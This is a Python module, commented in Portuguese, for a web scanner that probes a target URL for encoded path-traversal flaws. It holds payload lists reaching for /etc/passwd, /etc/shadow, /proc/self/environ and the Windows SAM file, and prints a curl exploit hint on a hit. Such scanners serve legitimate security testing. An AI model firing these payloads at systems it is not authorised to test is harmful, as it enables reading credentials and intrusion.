#!/usr/bin/env python3

"""Modulo de testes de Path Traversal via Encoding.



Testa se o servidor e vulneravel a path traversal via encoding:

  - URL-encoded traversal (%2f, %252f)

  - Overlong UTF-8 (%c0%af, %e0%80%af)

  - Semicolon bypass (..;/, ..%3b)

  - Backslash traversal (..\\, %5c)

  - Null byte truncation (%00, %2500)

  - Mixed encoding combinations

  - Platform-specific paths (Linux /etc/passwd, Windows system32)



Fluxo:

  1. Envia requisicao baseline sem payloads

  2. Envia requisicoes com payloads de traversal encoding

  3. Compara respostas (status, tamanho, corpo)

  4. Classifica cada tecnica: vulnerable, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
from dataclasses import dataclass
from urllib.parse import urlparse, urlunparse

import httpx

from mytools.core.base import BaseScanner, ScanGroup
from mytools.core.utils import (
    Cyber,
    color,
    create_async_client,
    print_exploit_info,
    run_concurrent,
)

logger = logging.getLogger("mytools.pathtraversal")


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "path": ["url_encoded", "double_encoded", "overlong_utf8", "overlong_3byte"],
    "param": ["param_traversal", "param_encoded", "param_json"],
    "semicolon": ["semicolon_bypass", "semicolon_encoded", "semicolon_double"],
    "mixed": ["mixed_encoding", "mixed_backslash", "tab_injection"],
    "platform": ["linux_passwd", "linux_proc", "windows_system"],
}


_TRAVERSAL_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
    ("url_encoded", "..%2f..%2f..%2fetc/passwd"),
    ("url_encoded", "..%2f..%2f..%2fproc/self/environ"),
    ("double_encoded", "..%252f..%252f..%252fetc/passwd"),
    ("double_encoded", "..%252f..%252fetc/passwd%2500"),
    ("overlong_utf8", "..%c0%af..%c0%afetc/passwd"),
    ("overlong_utf8", "..%c0%5c..%c0%5cwindows/win.ini"),
    ("overlong_3byte", "..%e0%80%af..%e0%80%afetc/passwd"),
]


_SEMICOLON_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
    ("semicolon_bypass", "..;/..;/..;/etc/passwd"),
    ("semicolon_encoded", "..%3b..%3b..%3betc/passwd"),
    ("semicolon_double", "..%253b..%253b..%253betc/passwd"),
]


_MIXED_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
    ("mixed_encoding", "..%c0%af..%252fetc/passwd"),
    ("mixed_backslash", "..%5c..%2fetc/passwd"),
    ("tab_injection", "..%09..%09..%09etc/passwd"),
]


_PLATFORM_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
    ("linux_passwd", "..%2f..%2f..%2fetc/passwd"),
    ("linux_passwd", "..%2f..%2f..%2fetc/shadow"),
    ("linux_proc", "..%2f..%2f..%2fproc/self/environ"),
    ("linux_proc", "..%2f..%2f..%2fproc/self/cmdline"),
    ("windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"),
    ("windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"),
]


def _load_category_map():
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "pathtraversal", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )
    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


def _load_traversal_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "pathtraversal",
        default={"traversal_payloads": _TRAVERSAL_PAYLOADS_DEFAULT},
    )
    raw = data.get("traversal_payloads", _TRAVERSAL_PAYLOADS_DEFAULT)
    return [tuple(item) for item in raw]


def _load_semicolon_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "pathtraversal",
        default={"semicolon_payloads": _SEMICOLON_PAYLOADS_DEFAULT},
    )
    raw = data.get("semicolon_payloads", _SEMICOLON_PAYLOADS_DEFAULT)
    return [tuple(item) for item in raw]


def _load_mixed_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "pathtraversal", default={"mixed_payloads": _MIXED_PAYLOADS_DEFAULT}
    )
    raw = data.get("mixed_payloads", _MIXED_PAYLOADS_DEFAULT)
    return [tuple(item) for item in raw]


def _load_platform_payloads():
    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "pathtraversal",
        default={"platform_payloads": _PLATFORM_PAYLOADS_DEFAULT},
    )
    raw = data.get("platform_payloads", _PLATFORM_PAYLOADS_DEFAULT)
    return [tuple(item) for item in raw]


_CATEGORY_MAP = _load_category_map()
_TRAVERSAL_PAYLOADS = _load_traversal_payloads()
_SEMICOLON_PAYLOADS = _load_semicolon_payloads()
_MIXED_PAYLOADS = _load_mixed_payloads()
_PLATFORM_PAYLOADS = _load_platform_payloads()


@dataclass(frozen=True, slots=True)
class PathTraversalAttempt:
    """Tentativa individual de path traversal via encoding."""

    technique: str

    category: str

    url: str

    payload: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class PathTraversalResult:
    """Resultado consolidado do scan de path traversal."""

    target: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[PathTraversalAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""

    try:
        resp = await client.get(url, follow_redirects=False)

        return resp.status_code, len(resp.content), resp.content

    except httpx.RequestError:
        return 0, 0, b""


async def _test_path_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[PathTraversalAttempt]:
    """Testa path traversal via encoding em URLs."""

    attempts: list[PathTraversalAttempt] = []

    b_status, b_size, _ = baseline

    parsed = urlparse(url)

    base_path = parsed.path.rstrip("/")

    for technique, payload in _TRAVERSAL_PAYLOADS:
        test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))

        try:
            resp = await client.get(test_url, follow_redirects=False)

            t_status = resp.status_code

            t_size = len(resp.content)

            status_changed = t_status != b_status

            size_changed = abs(t_size - b_size) > 50

            vulnerable = status_changed and t_status == 200

            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="path",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=size_changed,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
                    tool="curl",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="path",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_param_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[PathTraversalAttempt]:
    """Testa path traversal via parametros GET/POST."""

    attempts: list[PathTraversalAttempt] = []

    b_status, b_size, _ = baseline

    parsed = urlparse(url)

    base_url = urlunparse(parsed._replace(query=""))

    traversal_payloads = [
        ("param_traversal", {"file": "..%2f..%2f..%2fetc/passwd"}),
        ("param_encoded", {"path": "..%252f..%252fetc/passwd"}),
        ("param_json", {"path": "..%c0%af..%c0%afetc/passwd"}),
    ]

    for technique, data in traversal_payloads:
        try:
            resp = await client.get(base_url, params=data, follow_redirects=False)

            t_status = resp.status_code

            t_size = len(resp.content)

            status_changed = t_status != b_status

            vulnerable = status_changed and t_status == 200

            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="param",
                    url=base_url,
                    payload=str(data),
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
                    tool="curl",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="param",
                    url=base_url,
                    payload=str(data),
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_semicolon_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[PathTraversalAttempt]:
    """Testa path traversal via semicolon bypass."""

    attempts: list[PathTraversalAttempt] = []

    b_status, b_size, _ = baseline

    parsed = urlparse(url)

    base_path = parsed.path.rstrip("/")

    for technique, payload in _SEMICOLON_PAYLOADS:
        test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))

        try:
            resp = await client.get(test_url, follow_redirects=False)

            t_status = resp.status_code

            t_size = len(resp.content)

            status_changed = t_status != b_status

            vulnerable = status_changed and t_status == 200

            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="semicolon",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
                    tool="curl",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="semicolon",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_mixed_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[PathTraversalAttempt]:
    """Testa path traversal via mixed encoding."""

    attempts: list[PathTraversalAttempt] = []

    b_status, b_size, _ = baseline

    parsed = urlparse(url)

    base_path = parsed.path.rstrip("/")

    for technique, payload in _MIXED_PAYLOADS:
        test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))

        try:
            resp = await client.get(test_url, follow_redirects=False)

            t_status = resp.status_code

            t_size = len(resp.content)

            status_changed = t_status != b_status

            vulnerable = status_changed and t_status == 200

            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="mixed",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
                    tool="curl",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="mixed",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def _test_platform_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[PathTraversalAttempt]:
    """Testa path traversal via platform-specific paths."""

    attempts: list[PathTraversalAttempt] = []

    b_status, b_size, _ = baseline

    parsed = urlparse(url)

    base_path = parsed.path.rstrip("/")

    for technique, payload in _PLATFORM_PAYLOADS:
        test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))

        try:
            resp = await client.get(test_url, follow_redirects=False)

            t_status = resp.status_code

            t_size = len(resp.content)

            status_changed = t_status != b_status

            vulnerable = status_changed and t_status == 200

            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="platform",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca",
                    error="",
                    exploit="curl <TARGET>/../../etc/passwd" if vulnerable else "",
                    tool="curl",
                )
            )

        except httpx.RequestError as exc:
            attempts.append(
                PathTraversalAttempt(
                    technique=technique,
                    category="platform",
                    url=test_url,
                    payload=payload,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                )
            )

    return attempts


async def scan_path_traversal(
    url: str,
    timeout: float = 10.0,
    user_agent: str | None = None,
    proxy: str | None = None,
    verify: bool = False,
    category: str | None = None,
    concurrency: int = 5,
) -> PathTraversalResult:
    """Executa scan de path traversal via encoding contra a URL alvo."""

    parsed = urlparse(url)

    if not parsed.scheme:
        url = f"http://{url}"

        parsed = urlparse(url)

    tls = parsed.scheme == "https"

    async with create_async_client(
        user_agent=user_agent or "MyTools/pathtraversal",
        proxy=proxy,
        timeout=timeout,
        verify=verify,
    ) as client:
        b_status, b_size, b_body = await _test_baseline(client, url)

        baseline = (b_status, b_size, b_body)

        coros = []

        selected = _CATEGORY_MAP.get(category, []) if category else []

        if not category or category == "path":
            coros.append(_test_path_traversal(client, url, baseline))

        if not category or category == "param":
            coros.append(_test_param_traversal(client, url, baseline))

        if not category or category == "semicolon":
            coros.append(_test_semicolon_traversal(client, url, baseline))

        if not category or category == "mixed":
            coros.append(_test_mixed_traversal(client, url, baseline))

        if not category or category == "platform":
            coros.append(_test_platform_traversal(client, url, baseline))

        if category and not selected:
            return PathTraversalResult(
                target=url,
                baseline_status=b_status,
                baseline_size=b_size,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=[f"Categoria desconhecida: {category}"],
                overall_status="error",
            )

        results = await run_concurrent(coros, concurrency)

        all_attempts: list[PathTraversalAttempt] = []

        for r in results:
            if isinstance(r, list):
                all_attempts.extend(r)

    vulnerable: list[str] = []

    blocked: list[str] = []

    issues: list[str] = []

    seen: set[str] = set()

    for att in all_attempts:
        if att.technique not in seen:
            seen.add(att.technique)

            if att.vulnerable:
                vulnerable.append(att.technique)

            elif att.status_changed:
                blocked.append(att.technique)

    if vulnerable:
        issues.append(f"{len(vulnerable)} tecnicas de path traversal vulneraveis")

    if blocked:
        issues.append(f"{len(blocked)} tecnicas bloqueadas pelo servidor")

    overall = "vulnerable" if vulnerable else "blocked" if blocked else "secure"

    return PathTraversalResult(
        target=url,
        baseline_status=b_status,
        baseline_size=b_size,
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vulnerable,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )


def print_results_fn(result: PathTraversalResult) -> None:
    """Exibe os resultados do scan formatados."""

    print()

    print(color("=" * 60, Cyber.CYAN))

    print(color("  PATH TRAVERSAL VIA ENCODING SCAN", Cyber.CYAN))

    print(color("=" * 60, Cyber.CYAN))

    print(color(f"  Target: {result.target}", Cyber.WHITE))

    print(
        color(
            f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )

    print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))

    status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN

    print(color(f"\n  Status: {result.overall_status.upper()}", status_color))

    if result.vulnerable_techniques:
        print(color("\n  [VULNERAVEL]", Cyber.RED))

        for tech in result.vulnerable_techniques:
            print(color(f"    - {tech}", Cyber.RED))

            a = next((a for a in result.attempts if a.technique == tech), None)

            if a:
                print_exploit_info(a.exploit, a.tool)

    if result.blocked_techniques:
        print(color("\n  [BLOQUEADO]", Cyber.GREEN))

        for tech in result.blocked_techniques:
            print(color(f"    - {tech}", Cyber.GREEN))

    if result.issues:
        print(color("\n  Observacoes:", Cyber.YELLOW))

        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))

    print(color("=" * 60, Cyber.CYAN))


class PathtraversalScanner(BaseScanner):
    """Scanner de Path Traversal via Encoding — detecta bypass de traversal via encoding.."""

    prog = "mytools-ptraversal"
    description = (
        "Path Traversal via Encoding — detecta bypass de traversal via encoding."
    )
    prompt = "ptraversal> "
    module_name = "mytools.pathtraversal"
    banner_text = r"""


     _   _                      _____                        _       _ _

    | \ | |                    |  __ \                      | |     (_) |

    |  \| | _____  ___   _  __| |  | | ___  _ __ _ __ ___   | | __ _ _| |_

    | . ` |/ _ \ \/ / | | |/ _` |  | |/ _ \| '__| '_ ` _ \  | |/ _` | | __|

    | |\  |  __/>  <| |_| | (_| |  | | (_) | |  | | | | | | | | (_| | | |_

    |_| \_|\___/_/\_\\__,_|\__,_|_|  \___/|_|  |_| |_| |_| |_|\__,_|_|\__|
    """
    group = ScanGroup.B

    def _add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("url", nargs="?", help="URL alvo para teste")
        parser.add_argument(
            "-c",
            "--category",
            choices=list(_CATEGORY_MAP.keys()),
            help="Categoria de teste (path, param, semicolon, mixed, platform)",
        )
        parser.add_argument(
            "--concurrency",
            type=int,
            default=5,
            help="Numero de requisicoes simultaneas (default: 5)",
        )

    async def run_scan(self, **kwargs):  # type: ignore[override]
        return await scan_path_traversal(**kwargs)

    def print_results(self, result: object) -> None:
        print_results_fn(result)  # type: ignore[arg-type]

    def _example(self) -> str:
        return "https://target.com -c path"

    def _help(self) -> str:
        return (
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            " https://target.com\n"
            " https://target.com -c path\n"
            " https://target.com -c semicolon\n"
            " https://target.com -c platform --proxy http://127.0.0.1:8080"
        )


scanner = PathtraversalScanner()
main = scanner.main
run_once = scanner.run_once
banner_art = scanner._make_banner()

# Backward-compatible re-exports for tests
build_parser = scanner.build_parser
print_results = print_results_fn

if __name__ == "__main__":
    raise SystemExit(main())
